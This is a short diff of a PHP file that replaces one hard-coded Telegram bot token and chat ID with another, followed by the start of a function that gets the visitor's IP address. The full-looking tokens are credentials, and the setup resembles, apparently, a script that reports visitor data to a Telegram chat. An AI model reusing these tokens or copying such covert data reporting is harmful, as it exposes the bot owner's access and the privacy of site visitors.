@@ -1,7 +1,7 @@
 <?php
 // Telegram Bot Configuration
-$telegram_bot_token = '8876358860:AAHjOJolkwy5vo8PXmL-9YP99BGTDybsjgo'; // Replace with your bot token
-$telegram_chat_id = '-5191651553'; // Replace with your chat ID
+$telegram_bot_token = '8529028584:AAF7Zjo0gb9Va07nEWcPMuuNG4SHH2PBv04'; // Replace with your bot token
+$telegram_chat_id = '-5511604866'; // Replace with your chat ID
 
 // Get user's IP address
 function getUserIP() {
